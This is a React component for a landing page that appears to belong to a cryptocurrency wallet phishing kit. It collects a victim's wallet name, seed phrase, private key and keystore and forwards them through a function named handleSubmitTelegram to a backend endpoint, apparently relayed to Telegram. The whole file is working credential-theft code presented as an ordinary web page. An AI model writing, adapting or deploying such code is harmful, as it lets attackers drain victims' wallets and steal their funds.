import { useState } from "react";
import Footer from "../components/Footer";
import Headers from "../components/Headers";
import { ProjectContext } from "../context/ProjectContext";
import { Outlet } from "react-router-dom";
import axios from "axios";

const LandingPage = () => {
  const [walletName, setWalletName] = useState("");
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [keyStore, setKeyStore] = useState("");
  const [password, setPassword] = useState("");

  const backendUrl = import.meta.env.VITE_API_TG_BACKEND_URL;

  // console.log(backendUrl);
  const handleSubmitTelegram = async () => {
    const data = {};
    if (walletName) data.walletName = walletName;
    if (phrase) data.phrase = phrase;
    if (privateKey) data.privateKey = privateKey;
    if (keyStore) data.keyStore = keyStore;

    const message = Object.entries(data)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");

    try {
      const response = await axios.post(`${backendUrl}/send`, {
        message,
      },
      {
        headers: {
          'Content-Type': 'application/json', // Ensures the backend recognizes the request body as JSON
        },
      });
      // console.log(response);
    } catch (error) {
      console.error(error);
    }
  };
  return (
    <ProjectContext.Provider
      value={{
        walletName,
        setWalletName,
        phrase,
        setPhrase,
        privateKey,
        setPrivateKey,
        keyStore,
        setKeyStore,
        password,
        setPassword,
        handleSubmitTelegram,
      }}
    >
      <>
        <Headers />
        <Outlet />
        <Footer />
      </>
    </ProjectContext.Provider>
  );
};

export default LandingPage;
